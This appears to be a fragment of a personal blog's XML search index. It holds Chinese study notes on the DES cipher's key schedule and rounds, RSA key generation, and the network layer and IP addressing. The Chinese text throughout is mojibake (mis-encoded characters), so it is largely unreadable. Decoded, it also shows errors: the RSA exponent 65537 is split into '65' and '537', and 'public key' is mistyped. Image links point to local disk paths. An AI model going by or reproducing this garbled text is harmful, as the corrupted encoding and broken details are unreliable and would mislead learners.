    <content type="text"><![CDATA[ç®€ä»‹ï¼š DESæ˜¯å¯¹ç§°çš„ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒä½¿ç”¨åŒä¸€ä¸ªå¯†é’¥æ¥åŠ å¯†å’Œè§£å¯†æ•°æ®ã€‚DESè¿˜å’ŒRSAä¸€æ ·æ˜¯ä¸€ç§åˆ†ç»„åŠ å¯†ç®—æ³•ï¼Œè¯¥ç®—æ³•æ¯æ¬¡å¤„ç†å›ºå®šé•¿åº¦çš„æ•°æ®æ®µï¼Œç§°ä¹‹ä¸ºåˆ†ç»„ã€‚DESåˆ†ç»„çš„å¤§å°æ˜¯64ä½ï¼Œå¦‚æžœåŠ å¯†çš„æ•°æ®é•¿åº¦ä¸æ˜¯64ä½çš„å€æ•°ï¼Œå¯ä»¥æŒ‰ç…§æŸç§å…·ä½“çš„è§„åˆ™æ¥å¡«å……ä½ã€‚ ä»Žæœ¬è´¨ä¸Šæ¥è¯´ï¼ŒDESçš„å®‰å…¨æ€§ä¾èµ–äºŽè™šå‡è¡¨è±¡ï¼Œä»Žå¯†ç å­¦çš„æœ¯è¯­æ¥è®²å°±æ˜¯ä¾èµ–äºŽâ€œæ··ä¹±å’Œæ‰©æ•£â€çš„åŽŸåˆ™ã€‚æ··ä¹±çš„ç›®çš„æ˜¯ä¸ºéšè—ä»»ä½•æ˜Žæ–‡åŒå¯†æ–‡ã€æˆ–è€…å¯†é’¥ä¹‹é—´çš„å…³ç³»ï¼Œè€Œæ‰©æ•£çš„ç›®çš„æ˜¯ä½¿æ˜Žæ–‡ä¸­çš„æœ‰æ•ˆä½å’Œå¯†é’¥ä¸€èµ·ç»„æˆå°½å¯èƒ½å¤šçš„å¯†æ–‡ã€‚ä¸¤è€…ç»“åˆåˆ°ä¸€èµ·å°±ä½¿å¾—å®‰å…¨æ€§å˜å¾—ç›¸å¯¹è¾ƒé«˜ã€‚ DESç®—æ³•å…·ä½“é€šè¿‡å¯¹æ˜Žæ–‡è¿›è¡Œä¸€ç³»åˆ—çš„æŽ’åˆ—å’Œæ›¿æ¢æ“ä½œæ¥å°†å…¶åŠ å¯†ã€‚è¿‡ç¨‹çš„å…³é”®å°±æ˜¯ä»Žç»™å®šçš„åˆå§‹å¯†é’¥ä¸­å¾—åˆ°16ä¸ªå­å¯†é’¥çš„å‡½æ•°ã€‚è¦åŠ å¯†ä¸€ç»„æ˜Žæ–‡ï¼Œæ¯ä¸ªå­å¯†é’¥æŒ‰ç…§é¡ºåºï¼ˆ1-16ï¼‰ä»¥ä¸€ç³»åˆ—çš„ä½æ“ä½œæ–½åŠ äºŽæ•°æ®ä¸Šï¼Œæ¯ä¸ªå­å¯†é’¥ä¸€æ¬¡ï¼Œä¸€å…±é‡å¤16æ¬¡ã€‚æ¯ä¸€æ¬¡è¿­ä»£ç§°ä¹‹ä¸ºä¸€è½®ã€‚è¦å¯¹å¯†æ–‡è¿›è¡Œè§£å¯†å¯ä»¥é‡‡ç”¨åŒæ ·çš„æ­¥éª¤ï¼Œåªæ˜¯å­å¯†é’¥æ˜¯æŒ‰ç…§é€†å‘çš„é¡ºåºï¼ˆ16-1ï¼‰å¯¹å¯†æ–‡è¿›è¡Œå¤„ç†ã€‚ ![åˆ†ç»„åŠ å¯†](D:\My Daily\P\a61af216-b685-3141-8919-9e585d0b7556.png) ![DESåŠ å¯†è¿‡ç¨‹æ€»è§ˆ](D:\My Daily\P\57006f38-2576-3e9a-af0c-522b1f16eb2a.jpg) ![å¯†é’¥ç”Ÿæˆ](D:\My Daily\P\c15593ad-5a4c-3782-919b-ea04ca82b8c1.jpg) ![å…·ä½“è¿‡ç¨‹](D:\My Daily\P\d730d46d-d62e-3126-b98a-8e37405a1ec0.jpg) èŽ·å–å­å¯†é’¥Kiå…±16ä¸ªï¼šDESçš„åˆå§‹å¯†é’¥Kä¸º64ä½ï¼ŒæŒ‰8è¡Œ8åˆ—ä»Žå·¦å¾€å³ä»Žä¸Šå¾€ä¸‹æŽ’åˆ—ï¼Œå…¶ä¸­æ¯è¡Œç¬¬8ä½ç”¨äºŽå¥‡å¶æ ¡éªŒï¼Œå› æ­¤Keyå®žé™…å¯ç”¨ä½æ•°ä¸º56ã€‚ â€‹ é¦–å…ˆï¼Œ64ä½çš„åˆå§‹å¯†é’¥Kç»è¿‡PC-1ä¹‹åŽï¼Œç”Ÿæˆ56ä½çš„ä¸²ã€‚ ![e36ece9b-d47c-3a27-8533-027a1f36c762](D:\My Daily\P\e36ece9b-d47c-3a27-8533-027a1f36c762.png) ç”±è¡¨å¯çŸ¥ï¼Œåˆå§‹å¯†é’¥Kç¬¬8ã€16ã€24ã€32ã€40ã€48ã€56ã€64å…±8ä¸ªæ ¡éªŒä½è¢«åŽ»æŽ‰ï¼Œå‰©ä½™56ä½æŒ‰è¡¨æ‰€ç¤ºæ–¹å¼æŽ’åˆ—ï¼šç¬¬57ä½æ”¾åœ¨ç¬¬1ä½ï¼Œç¬¬49ä½æ”¾åœ¨ç¬¬2ä½ï¼Œä¾æ¬¡ç±»æŽ¨ã€‚ ç»è¿‡PC-1ç½®æ¢ä¹‹åŽï¼Œå°†ç½®æ¢è¾“å‡ºå†åˆ†ä¸ºå‰28ä½C0å’ŒåŽ28ä½D0ä¸¤éƒ¨åˆ†ï¼Œåˆ†åˆ«å¾ªçŽ¯å·¦ç§»1ä½å¾—åˆ°C1å’ŒD1ï¼Œç„¶åŽå°†ä¸¤éƒ¨åˆ†åˆå¹¶æˆ56ä½ï¼Œç„¶åŽç»è¿‡PC-2å˜æ¢ä¹‹åŽç”Ÿæˆ48ä½çš„å­å¯†é’¥K1ã€‚ ![78c0a354-e216-32db-9310-d1f3abcaf1b5](D:\My Daily\P\78c0a354-e216-32db-9310-d1f3abcaf1b5.png) â€‹ C1ã€D1åˆ†åˆ«å¾ªçŽ¯å·¦ç§»1ä½å¾—åˆ°C2ã€D2ï¼Œåˆå¹¶ç»è¿‡PC-2ç”Ÿæˆå­å¯†é’¥K2ã€‚ä¾æ¬¡ç±»æŽ¨ï¼Œç›´è‡³ç”Ÿæˆå­å¯†é’¥K16ã€‚æ³¨æ„ï¼Œæ¯è½®å¾ªçŽ¯å·¦ç§»çš„ä½æ•°æœ‰å¦‚ä¸‹è§„å®šï¼š ![78c0a354-e216-32db-9310-d1f3abcaf1b5](D:\My Daily\P\78c0a354-e216-32db-9310-d1f3abcaf1b5.png) è‡³æ­¤ï¼ŒåŠ å¯†è¿‡ç¨‹éœ€è¦çš„16ä¸ªå­å¯†é’¥å…¨éƒ¨ç”Ÿæˆå®Œæ¯•ï¼Œä¸‹é¢æˆ‘ä»¬æ¥çœ‹å…·ä½“å¦‚ä½•åŠ å¯†ã€‚ åŠ å¯†è¿‡ç¨‹ï¼šåˆå§‹ç½®æ¢ï¼š 64ä½æ˜Žæ–‡ä¸²ç»è¿‡ä¸€ä¸ªåˆå§‹ç½®æ¢å‡½æ•°IPï¼Œç”Ÿæˆé‡æ–°æŽ’åˆ—ä¹‹åŽçš„64ä½è¾“å‡ºï¼Œåˆ†ä¸ºå·¦32ä½L0å’Œå³32ä½R0ï¼Œç”¨äºŽFå‡½æ•°16è½®è¿­ä»£è¿ç®—çš„é¦–æ¬¡è¿­ä»£çš„åˆå§‹![5e1046ae-8449-3f2a-98ad-e16ae4fee37c](D:\My Daily\P\5e1046ae-8449-3f2a-98ad-e16ae4fee37c.png)è¾“å…¥ã€‚ è¿­ä»£è¿ç®—ï¼šR0ä¸Žå­å¯†é’¥K1ç»è¿‡å¯†ç å‡½æ•°å˜æ¢F(R0,K1)å¾—åˆ°32ä½è¾“å‡ºf1ï¼Œf1ä¸ŽL0åšäºŒè¿›åˆ¶å¼‚æˆ–è¿ç®—ï¼Œç»“æžœèµ‹ç»™R1ï¼ŒR0åˆ™åŽŸå°ä¸åŠ¨åœ°èµ‹ç»™L1ã€‚ç„¶åŽR1ä¸Žå­å¯†é’¥K2ç»è¿‡å‡½æ•°å˜æ¢F(R1,K2)å¾—åˆ°32ä½è¾“å‡ºf2ï¼Œf2ä¸ŽL1åšäºŒè¿›åˆ¶å¼‚æˆ–è¿ç®—ï¼Œç»“æžœèµ‹ç»™R2ï¼ŒR1åˆ™åŽŸå°ä¸åŠ¨åœ°èµ‹ç»™L2â€¦.ä¾æ­¤ç±»æŽ¨ï¼Œä¸€å…±ç»è¿‡16æ¬¡è¿­ä»£è¿ç®—ç›´è‡³æœ€åŽç”ŸæˆL16å’ŒR16ã€‚ Få‡½æ•°ï¼š å¯†ç å‡½æ•°FæŽ¥å—ä¸¤ä¸ªè¾“å…¥ï¼š32ä½æ•°æ®å’Œ48ä½å­å¯†é’¥ï¼Œè¾“å‡ºç»“æžœä¸º32ä½ã€‚å…·ä½“è¿ç®—å¦‚ä¸‹ï¼š æ‰©å±•ç½®æ¢ï¼š 32ä½æ•°æ®é€šè¿‡æ‰©å±•ç½®æ¢Eä»Ž32ä½æ‰©å±•ä¸º48ä½ï¼Œæ‰©å±•ç½®æ¢é€šè¿‡å°†åŽŸ32ä½æ•°æ®ä¸­çš„æŸäº›ä½é‡å¤å‡ºçŽ°è¾¾åˆ°æ‰©å±•çš„ç›®çš„ã€‚ ![1ad0eab2-2430-306f-a3e2-ee367e52844d](D:\My Daily\P\1ad0eab2-2430-306f-a3e2-ee367e52844d.png) å¼‚æˆ–è¿ç®—ï¼šæ‰©å±•ç½®æ¢çš„è¾“å‡º(48ä½)ä¸Žå­å¯†é’¥(48ä½)åšå¼‚æˆ–è¿ç®—ï¼Œè¾“å‡ºä¸º48ä½ã€‚ Sç›’ç½®æ¢ï¼šå°†å¼‚æˆ–è¿ç®—å¾—åˆ°çš„48ä½ç»“æžœæ•°æ®åˆ†æˆ8ä¸ª6ä½çš„å—ï¼Œæ¯å—é€šè¿‡å¯¹åº”çš„ä¸€ä¸ªSç›’äº§ç”Ÿä¸€ä¸ª4ä½çš„è¾“å‡ºã€‚8ä¸ª6ä½æ•°æ®çš„ç½®æ¢ç»“æžœè¿žåœ¨ä¸€èµ·ï¼Œå½¢æˆ32ä½è¾“å‡ºç»“æžœã€‚æ¯ä¸ªSç›’å®žé™…ä¸Šæ˜¯ä¸€å¼ 4(0-3)è¡Œ16(0-15)åˆ—çš„ç½®æ¢è¡¨ï¼Œæ³¨æ„ï¼Œè¡Œåˆ—ç¼–å·éƒ½ä»Ž0å¼€å§‹ã€‚ Sç›’æŽ¥æ”¶6ä½çš„æ•°æ®ï¼Œç»è¿‡ç½®æ¢è¾“å‡º4ä½çš„æ•°æ®ï¼Œå…¶å…·ä½“ç½®æ¢è¿‡ç¨‹ä¸ºï¼šå°†6ä½æ•°æ®çš„ç¬¬1ä½å’Œç¬¬6ä½å–å‡ºæ¥ï¼Œå½¢æˆä¸€ä¸ª2ä½çš„äºŒè¿›åˆ¶æ•°xï¼ˆä»Ž0-3ï¼‰ï¼Œå‰©ä¸‹çš„4ä½æž„æˆå¦ä¸€ä¸ªäºŒè¿›åˆ¶æ•°yï¼ˆä»Ž0-15ï¼‰ï¼Œç„¶åŽæŸ¥å‡ºSç›’xè¡Œyåˆ—å¯¹åº”çš„åè¿›åˆ¶æ•´æ•°ï¼Œå°†è¯¥æ•´æ•°è½¬æ¢ä¸ºä¸€ä¸ª4ä½äºŒè¿›åˆ¶æ•°ï¼Œå³ä¸ºSç›’çš„è¾“å‡ºã€‚ ![656691cd-0026-3fa4-8f52-d6de1afc655e](D:\My Daily\P\656691cd-0026-3fa4-8f52-d6de1afc655e.jpg) Pç›’ç½®æ¢ï¼šSç›’ç½®æ¢çš„æœ€ç»ˆç»“æžœ32ä½æ•°æ®é€šè¿‡Pç›’ç½®æ¢ï¼ŒåŒæ ·ç”Ÿæˆ32ä½è¾“å‡ºç»“æžœã€‚ ![d0d97c5e-174c-3dd5-b905-90f00db13101](D:\My Daily\P\d0d97c5e-174c-3dd5-b905-90f00db13101.png) æœ«ç½®æ¢ï¼š L16ã€R16åˆåœ¨ä¸€èµ·64ä½ï¼Œç»è¿‡æœ«ç½®æ¢å‡½æ•°IP-1ï¼Œå¾—åˆ°64ä½å¯†æ–‡è¾“å‡ºã€‚ ![fccf3950-2019-3c20-a910-5c342b550be4](D:\My Daily\P\fccf3950-2019-3c20-a910-5c342b550be4.png)]]></content>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RSA]]></title>
    <url>%2F2020%2F04%2F07%2FRSA%2F</url>
    <content type="text"><![CDATA[ç®€ä»‹ï¼š RSAæ˜¯éžå¯¹ç§°çš„ï¼Œå³åŠ å¯†å¯†é’¥ä¸Žè§£å¯†å¯†é’¥ä¸æ˜¯åŒä¸€ä¸ªã€‚å½“æ•°æ®åœ¨ç½‘ç»œä¸­ä¼ è¾“æ—¶ï¼Œç”¨æ¥åŠ å¯†æ•°æ®çš„å¯†é’¥å¹¶ä¸éœ€è¦ä¹Ÿå’Œæ•°æ®ä¸€èµ·ä¼ é€ï¼Œè¿™å°±å‡å°‘äº†å¯†é’¥æ³„éœ²çš„å¯èƒ½æ€§ã€‚åŠ å¯†çš„ä¸€æ–¹ä½¿ç”¨ä¸€ä¸ªå¯†é’¥ç§°ä¸ºå…±åŽ‹è¿«ï¼Œè§£å¯†çš„ä¸€æ–¹ä½¿ç”¨ä¸€ä¸ªå¯†é’¥ç§°ä¸ºç§é’¥ï¼Œç§é’¥éœ€ä¿æŒå…¶ç§æœ‰æ€§ã€‚ å•å‘å‡½æ•°æ˜¯åŠ å¯†æŠ€æœ¯çš„åŸºç¡€ï¼Œç®€å•åœ°è¯´å°±æ˜¯åœ¨ä¸€ä¸ªæ–¹å‘ä¸Šèƒ½å¤Ÿå¾ˆå®¹æ˜“ç®—å‡ºç»“æžœï¼Œä½†æ˜¯åå‘æŽ¨å¯¼åˆ™ä¸åˆ‡å®žé™…ã€‚ è®¡ç®—å…¬é’¥ä¸Žç§é’¥ï¼š å…¬é’¥P=(e,n),ç§é’¥S=(d,n) é¦–å…ˆé€‰å‡ºä¸¤ä¸ªå¤§ç´ æ•°pqï¼Œç„¶åŽå¼€å§‹è®¡ç®—nï¼Œn=pqã€‚ æŽ¥ä¸‹æ¥é€‰æ‹©ä¸€ä¸ªè¾ƒå°çš„å¥‡æ•°eï¼Œé€‰æ‹©çš„é‡ç‚¹æ˜¯ä»–ä¸Ž(p-1)(q-1)ä¸èƒ½æœ‰ç›¸åŒçš„å› å­ã€‚é€šå¸¸é€‰æ‹©3ã€17ã€65ã€537ä½œä¸ºeçš„å€¼ã€‚ä½¿ç”¨è¿™äº›å€¼ä¸ä¼šå¯¹RSAçš„å®‰å…¨æ€§é€ æˆå½±å“ï¼Œå› ä¸ºè§£å¯†æ•°æ®è¿˜éœ€è¦ç”¨åˆ°ç§é’¥ã€‚ æŽ¥ä¸‹æ¥å¼€å§‹è®¡ç®—d,d = e-Â¹ mod (p-1)(q-1)å³dä¸Žeæ˜¯æ¨¡ä¹˜æ³•é€†å…ƒçš„å…³ç³»ã€‚ed mod (p-1)(q-1) = 1ã€‚æ¬§å‡ é‡Œå¾—ç®—æ³•å¯æ±‚å¾—ã€‚ åŠ å¯†æµç¨‹ï¼šm^e mod n=c è§£å¯†æµç¨‹ï¼šc^d mod n=m å°½ç®¡æ”»å‡»è€…å¯èƒ½çŸ¥é“äº†eå’Œnçš„å€¼ï¼Œä¸ºäº†è®¡ç®—å‡ºdå¿…é¡»çŸ¥é“Ï†(n)ï¼Œè€Œè¿™åˆå¿…é¡»åŒæ—¶å¾—åˆ°på’Œqçš„å€¼æ‰èƒ½åŠžåˆ°ã€‚ç”±äºŽpå’Œqæ˜¯ä¸å¯çŸ¥çš„ï¼Œå› æ­¤æ”»å‡»è€…åªèƒ½è®¡ç®—nçš„å› å­ï¼Œåªè¦ç»™å‡ºçš„på’Œqçš„å€¼è¶³å¤Ÿå¤§ï¼Œè¿™å°±æ˜¯ä¸€ä¸ªç›¸å½“è€—è´¹æ—¶é—´çš„è¿‡ç¨‹ã€‚]]></content>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ç½‘ç»œå±‚]]></title>
    <url>%2F2020%2F04%2F04%2F%E7%BD%91%E7%BB%9C%E5%B1%82%2F</url>
    <content type="text"><![CDATA[æœ¬ç« è®¨è®ºç½‘ç»œäº’è¿žé—®é¢˜ï¼šä»‹ç»ç½‘ç»œå±‚æä¾›çš„ä¸¤ç§ä¸åŒæœåŠ¡ä¹‹åŽï¼Œè¿›å…¥æœ¬ç« æ ¸å¿ƒå†…å®¹ï¼šç½‘é™…åè®®IPã€‚åªæœ‰æ·±å…¥åœ°æŽŒæ¡äº†IPåè®®çš„ä¸»è¦å†…å®¹ï¼Œæ‰èƒ½å¤Ÿç†è§£äº’è”ç½‘æ˜¯å¦‚ä½•å·¥ä½œçš„ã€‚å¹¶è®¨è®ºï¼šç½‘é™…æŽ§åˆ¶æŠ¥æ–‡åè®®ICMPï¼Œå‡ ç§å¸¸ç”¨çš„è·¯ç”±é€‰æ‹©åè®®ï¼ŒIPv6çš„ä¸»è¦ç‰¹ç‚¹ï¼ŒIPå¤šæ’­çš„æ¦‚å¿µï¼Œè™šæ‹Ÿä¸“ç”¨ç½‘VPNå’Œç½‘ç»œåœ°å€è½¬æ¢NATä»¥åŠå¤šåè®®æ ‡è®°äº¤æ¢MPLSã€‚ æœ¬ç« æœ€é‡è¦çš„å†…å®¹ï¼š è™šæ‹Ÿäº’è”ç½‘ç»œçš„æ¦‚å¿µã€‚ IPåœ°å€ä¸Žç‰©ç†åœ°å€çš„å…³ç³»ã€‚ ä¼ ç»Ÿçš„åˆ†ç±»IPåœ°å€(åŒ…æ‹¬å­ç½‘æŽ©ç )å’Œæ— åˆ†ç±»åŸŸé—´è·¯ç”±é€‰æ‹©CIDRã€‚ è·¯ç”±é€‰æ‹©åè®®çš„å·¥ä½œåŽŸç†ã€‚ ç”±äºŽè·³ç€å­¦ï¼Œå›žé¡¾ä¸‹äº”å±‚åè®®ï¼šä»Žé¡¶å‘ä¸‹åˆ†åˆ«æ˜¯åº”ç”¨å±‚ï¼Œè¿è¾“å±‚ï¼Œç½‘ç»œå±‚ï¼Œæ•°æ®é“¾è·¯å±‚å’Œç‰©ç†å±‚ã€‚ ç½‘ç»œå±‚æä¾›çš„ä¸¤ç§æœåŠ¡ï¼šåœ¨è®¡ç®—æœºç½‘ç»œé¢†åŸŸï¼Œç½‘ç»œå±‚åº”è¯¥å‘è¿è¾“å±‚æä¾›æ€Žæ ·çš„æœåŠ¡(é¢å‘è¿žæŽ¥/æ— è¿žæŽ¥)å¼•èµ·äº‰è®ºï¼šå®žè´¨å°±æ˜¯åœ¨è®¡ç®—æœºé€šä¿¡ä¸­å¯é äº¤ä»˜åº”å½“ç”±ç½‘ç»œè¿˜æ˜¯ç«¯ç³»ç»Ÿè´Ÿè´£ï¼Ÿ å¦‚æžœè®©ç½‘ç»œè´Ÿè´£å¯é äº¤ä»˜ï¼Œç”¨é¢å‘è¿žæŽ¥çš„é€šä¿¡æ–¹å¼ï¼Œå°±åƒä¼ ç»Ÿç”µä¿¡ç½‘ä¸€æ ·ï¼Œé‚£ä¹ˆå½“ä¸¤å°è®¡ç®—æœºè¿›è¡Œé€šä¿¡æ—¶ä¹Ÿåº”å½“å…ˆå»ºç«‹è¿žæŽ¥(ä½†åœ¨åˆ†ç»„äº¤æ¢ä¸­æ˜¯å»ºç«‹ä¸€æ¡è™šç”µè·¯VC)ï¼Œä»¥é¢„ç•™åŒæ–¹é€šä¿¡æ‰€éœ€çš„ä¸€åˆ‡ç½‘ç»œèµ„æºã€‚ç„¶åŽåŒæ–¹å°±æ²¿ç€å·²å»ºç«‹çš„è™šç”µè·¯å‘é€åˆ†ç»„ã€‚è¿™æ ·çš„åˆ†ç»„é¦–éƒ¨ä¸éœ€è¦å¡«å†™å®Œæ•´çš„ç›®çš„ä¸»æœºåœ°å€ï¼Œè€Œåªéœ€è¦å¡«å†™è¿™æ¡è™šç”µè·¯çš„ç¼–å·ã€‚ ä½†æ˜¯å¦ä¸€ç§æ–°çš„è®¾è®¡æ€è·¯è®¤ä¸ºè®¡ç®—æœºç½‘ç»œçš„ç«¯ç³»ç»Ÿæ˜¯æœ‰æ™ºèƒ½çš„è®¡ç®—æœºï¼Œæœ‰å¾ˆå¼ºçš„å·®é”™å¤„ç†èƒ½åŠ›ã€‚æ‰€ä»¥ç½‘ç»œå±‚å‘ä¸Šåªæä¾›ç®€å•çµæ´»çš„ï¼Œæ— è¿žæŽ¥çš„ï¼Œå°½æœ€å¤§åŠªåŠ›äº¤ä»˜çš„æ•°æ®æŠ¥æœåŠ¡ã€‚æ•°æ®åŒ…datagram/IPæ•°æ®æŠ¥å°±æ˜¯æˆ‘ä»¬ç»å¸¸ä½¿ç”¨çš„â€åˆ†ç»„â€ã€‚ç½‘ç»œåœ¨å‘é€åˆ†ç»„æ—¶ä¸éœ€è¦å»ºç«‹è¿žæŽ¥ï¼Œæ¯ä¸€ä¸ªåˆ†ç»„ç‹¬ç«‹å‘é€ã€‚ç½‘ç»œå±‚ä¸æä¾›æœåŠ¡è´¨é‡çš„æ‰¿è¯ºã€‚ç”±äºŽä¼ è¾“ç½‘ç»œä¸æä¾›ç«¯å¯¹ç«¯çš„å¯é ä¼ è¾“æœåŠ¡ï¼Œè¿™å°±ä½¿å¾—ç½‘ç»œä¸­çš„è·¯ç”±å™¨æ¯”è¾ƒç®€å•ï¼Œå¹¶ä¸”ä»·æ ¼ä½Žå»‰ã€‚å¦‚æžœç«¯ç³»ç»Ÿä¸­è¿›ç¨‹çš„é€šä¿¡éœ€è¦æ˜¯å¯é çš„ï¼Œå°±ç”±ç½‘ç»œçš„ä¸»æœºä¸­çš„è¿è¾“å±‚è´Ÿè´£ã€‚è¿™ç§æ–¹å¼ä¸ºäº’è”ç½‘çš„å¹¿æ³›å‘å±•å¥ å®šåŸºç¡€ã€‚ é‰´äºŽTCP/IPä½“ç³»çš„ç½‘ç»œå±‚æä¾›çš„æ˜¯æ•°æ®æŠ¥çš„æœåŠ¡ï¼Œå› æ­¤å›´ç»•ç½‘ç»œå±‚å¦‚ä½•ä¼ è¾“IPæ•°æ®æŠ¥è¿™ä¸ªä¸»é¢˜å±•å¼€è®¨è®ºï¼š ç½‘é™…åè®®IPï¼šç½‘é™…åè®®IPæ˜¯TCP/IPä½“ç³»ä¸­ä¸¤ä¸ªæœ€ä¸»è¦çš„åè®®ä¹‹ä¸€(é¡¾åæ€ä¹‰)ï¼Œä¸ŽIPåè®®é…å¥—çš„è¿˜æœ‰ä¸‰ä¸ªåè®®ï¼šåœ°å€è§£æžåè®®ARPï¼Œç½‘é™…æŽ§åˆ¶æŠ¥æ–‡åè®®ICMPï¼Œç½‘é™…ç»„ç®¡ç†åè®®IGMPã€‚ ![QQå›¾ç‰‡20200404120326](D:\My Daily\P\QQå›¾ç‰‡20200404120326.png) åœ¨è¿™ä¸€å±‚ä¸­ARPä½äºŽæœ€ä¸‹é¢ï¼Œå› ä¸ºIPç»å¸¸è¦ä½¿ç”¨è¿™ä¸ªåè®®ã€‚ICMPå’ŒIGMPä½äºŽè¿™ä¸€æ¬¡ä¸Šéƒ¨ï¼Œå› ä¸ºå®ƒä»¬è¦ä½¿ç”¨IPåè®®ã€‚ç”±äºŽç½‘é™…åè®®IPæ˜¯ç”¨æ¥ä½¿äº’è¿žçš„è®¡ç®—æœºä¹‹é—´å®žçŽ°é€šä¿¡çš„ï¼Œå› æ­¤TCP/IPä½“ç³»ä¸­çš„ç½‘ç»œå±‚é€šå¸¸ç§°ä¸ºç½‘é™…å±‚/IPå±‚ã€‚ è™šæ‹Ÿäº’è”ç½‘ç»œï¼š ç”±äºŽæ²¡æœ‰ä¸€ç§å•ä¸€çš„ç½‘ç»œèƒ½å¤Ÿé€‚åº”ç”¨æˆ·çš„æ‰€æœ‰éœ€æ±‚ï¼Œæ‰€ä»¥å°†ç½‘ç»œäº’ç›¸è¿žæŽ¥èµ·æ¥éœ€è¦ä½¿ç”¨ä¸€äº›ä¸­é—´è®¾å¤‡ã€‚æ ¹æ®ä¸­é—´è®¾å¤‡æ‰€åœ¨çš„å±‚æ¬¡ï¼Œå¯ä»¥æœ‰ä»¥ä¸‹å››ç§ä¸åŒçš„ä¸­é—´è®¾å¤‡ï¼š ç‰©ç†å±‚ä½¿ç”¨çš„ä¸­é—´è®¾å¤‡å«åšè½¬å‘å™¨(repeater). æ•°æ®é“¾è·¯å±‚ä½¿ç”¨çš„ä¸­é—´è®¾å¤‡å«åšç½‘æ¡¥/æ¡¥æŽ¥å™¨(bridge). ç½‘ç»œå±‚ä½¿ç”¨çš„ä¸­é—´è®¾å¤‡å«åšè·¯ç”±å™¨(router). åœ¨ç½‘ç»œå±‚ä»¥ä¸Šä½¿ç”¨çš„ä¸­é—´è®¾å¤‡å«åšç½‘å…³(gateway).ç”¨ç½‘å…³è¿žæŽ¥ä¸¤ä¸ªä¸å…¼å®¹çš„ç³»ç»Ÿéœ€è¦åœ¨é«˜å±‚è¿›è¡Œåè®®çš„è½¬æ¢ã€‚ å½“ä¸­é—´è®¾å¤‡æ˜¯è½¬å‘å™¨æˆ–è€…ç½‘æ¡¥æ—¶ï¼Œè¿™ä»…ä»…æ—¶æŠŠä¸€ä¸ªç½‘ç»œæ‰©å¤§äº†ï¼Œä»Žç½‘ç»œå±‚çš„å±‚æ¬¡æ¥çœ‹ï¼Œè¿™ä»ç„¶æ˜¯ä¸€ä¸ªç½‘ç»œï¼Œæ‰€ä»¥ä¸€èˆ¬ä¸ç§°ä¹‹ä¸ºç½‘ç»œäº’è¿žã€‚ç½‘å…³ç”±äºŽæ¯”è¾ƒå¤æ‚ï¼Œç›®å‰ä½¿ç”¨åœ°æ¯”è¾ƒå°‘ï¼Œå› æ­¤è®¨è®ºç½‘ç»œè¿žæŽ¥æ—¶ï¼Œéƒ½æ˜¯æŒ‡ç”¨è·¯ç”±å™¨è¿›è¡Œç½‘ç»œäº’è¿žå’Œè·¯ç”±é€‰æ‹©ã€‚è·¯ç”±å™¨å…¶å®žå°±æ˜¯ä¸€å°ä¸“ç”¨è®¡ç®—æœºï¼Œç”¨äºŽåœ¨äº’è”ç½‘ä¸­è¿›è¡Œè·¯ç”±é€‰æ‹©ã€‚ç”±äºŽåŽ†å²çš„åŽŸå› ï¼Œè®¸å¤šæœ‰å…³TCP/IPçš„æ–‡çŒ®å§ç½‘ç»œå±‚ä½¿ç”¨çš„è·¯ç”±å™¨ç§°ä¸ºç½‘å…³ã€‚ è®¸å¤šè®¡ç®—æœºç½‘ç»œé€šè¿‡ä¸€äº›è·¯ç”±å™¨è¿›è¡Œäº’è¿žï¼Œç”±äºŽå‚åŠ äº’è¿žçš„è®¡ç®—æœºç½‘ç»œéƒ½ä½¿ç”¨ç›¸åŒçš„ç½‘é™…åè®®IP:Internet Peotocolï¼Œå› æ­¤å¯ä»¥æŠŠäº’è”ä»¥åŽçš„è®¡ç®—æœºç½‘ç»œçœ‹æˆä¸€ä¸ªè™šæ‹Ÿäº’è¿žç½‘ç»œinternetã€‚ æ‰€è°“è™šæ‹Ÿäº’è¿žç½‘ç»œä¹Ÿå°±æ˜¯é€»è¾‘äº’è¿žç½‘ç»œï¼Œäº’è¿žèµ·æ¥çš„å„ç§è™šæ‹Ÿç‰©ç†ç½‘ç»œçš„å¼‚æž„åž‹æ˜¯å®¢è§‚å­˜åœ¨çš„ï¼Œä½†æ˜¯åˆ©ç”¨IPåè®®èƒ½å°†å…¶ç»Ÿä¸€æˆåœ¨ç½‘ç»œå±‚ä¸Šçœ‹èµ·æ¥æ—¶ç»Ÿä¸€çš„ç½‘ç»œã€‚è¿™ç§ä½¿ç”¨IPåè®®çš„è™šæ‹Ÿäº’è¿žç½‘ç»œç®€ç§°IPç½‘ã€‚ä½¿ç”¨IPç½‘ä¹‹åŽï¼Œå½“å…¶ä¸­çš„ä¸»æœºè¿›è¡Œé€šä¿¡æ—¶ï¼Œå°±å¥½åƒåœ¨å•ä¸ªç½‘ç»œä¸Šè¿›è¡Œé€šä¿¡ï¼Œè€Œä¸ç”¨å…³å¿ƒå…·ä½“çš„å¼‚æž„ç»†èŠ‚ã€‚åœ¨è¿™ç§è¦†ç›–å…¨çƒçš„IPç½‘çš„ä¸Šå±‚ä½¿ç”¨TCPåè®®ï¼Œé‚£ä¹ˆå°±æ˜¯çŽ°åœ¨çš„äº’è”ç½‘Internetã€‚ åˆ†ç±»çš„IPåœ°å€ï¼šIPåœ°å€åŠå…¶è¡¨ç¤ºæ–¹æ³•ï¼šæ•´ä¸ªçš„äº’è”ç½‘å°±æ˜¯ä¸€ä¸ªå•ä¸€çš„æŠ½è±¡ç½‘ç»œï¼ŒIPåœ°å€å°±æ˜¯ç»™äº’è”ç½‘ä¸Šçš„æ¯ä¸€å°ä¸»æœº/è·¯ç”±å™¨çš„æ¯ä¸€ä¸ªæŽ¥å£åˆ†é…ä¸€ä¸ªåœ¨å…¨ä¸–ç•ŒèŒƒå›´å†…æ˜¯å”¯ä¸€çš„32ä½æ ‡è¯†ç¬¦ï¼Œå®ƒç”±äº’è”ç½‘åå­—å’Œæ•°å­—åˆ†é…æœºæž„ICANNè¿›è¡Œåˆ†é…ã€‚IPåœ°å€çš„ç¼–å€æ–¹æ³•ç»åŽ†äº†ä¸‰ä¸ªé˜¶æ®µï¼š1ï¼šåˆ†ç±»çš„IPåœ°å€ï¼Œæœ€åŸºæœ¬æ–¹æ³•ã€‚2ï¼šå­ç½‘çš„åˆ’åˆ†ï¼Œæ”¹è¿›ã€‚3ï¼šæž„æˆè¶…ç½‘ã€‚ 